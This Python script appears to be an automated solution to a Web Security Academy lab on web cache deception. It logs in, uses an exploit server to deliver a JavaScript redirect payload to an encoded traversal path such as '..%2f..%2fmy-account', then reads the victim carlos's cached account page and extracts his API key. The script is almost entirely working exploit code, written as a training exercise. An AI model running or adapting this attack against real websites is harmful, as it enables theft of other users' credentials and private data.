###############################################################################
#
# Lab: Exploiting origin server normalization for web cache deception
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie
#      3. Log in as wiener
#      4. Send malicious payload to the victim to force caching their profile
#      5. Wait 1 seconds to ensure the cache is populated
#      6. Fetch carlos profile page from the cache
#      7. Extract the API key
#      8. Submit the solution
#
###############################################################################
import requests
import re
from colorama import Fore
import time
import httpx

# Change this to your lab URL
LAB_URL = "https://0a2700e703d1d2a28011031e00e00029.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0abe007d0390d2d4801a0248010000cc.exploit-server.net"

def main():
    print("â¦—1â¦˜ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch(LAB_URL, "/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    wiener_login = post_data(LAB_URL, "/login", cookies, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—4â¦˜ Sending malicious payload to the victim to force caching their profile.. ", end="", flush=True)

    payload = f"""<script>
                    location = "{LAB_URL}/resources/js/..%2f..%2fmy-account"
                </script>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }
    post_data(EXPLOIT_SERVER_URL, "/", data=data)
    fetch(EXPLOIT_SERVER_URL, "/deliver-to-victim")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—5â¦˜ Waiting 1 seconds to ensure the cache is populated.. ", end="", flush=True)
    time.sleep(1)   # you may need to change this to 2 or 3 seconds

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—6â¦˜ Fetching carlos profile page from the cache.. ", end="", flush=True)

    session = wiener_login.cookies.get("session")
    cookies = { "session": session }
    # use httpx instead of requests to preserve the encoded path
    carlos_profile = httpx.get(f"{LAB_URL}/resources/js/..%2f..%2fmy-account", cookies=cookies, follow_redirects=False)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—7â¦˜ Extracting the API key.. ", end="", flush=True)

    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—8â¦˜ Submitting the solution.. ", end="", flush=True)

    data = { "answer": api_key }
    post_data(LAB_URL, "/submitSolution", data=data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url, path, cookies = None):
    try:  
        return requests.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(url, path = None, cookies = None, data = None):
    try:    
        return requests.post(f"{url}{path}", data=data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")
        exit(1)
        
        
if __name__ == "__main__":
    main()

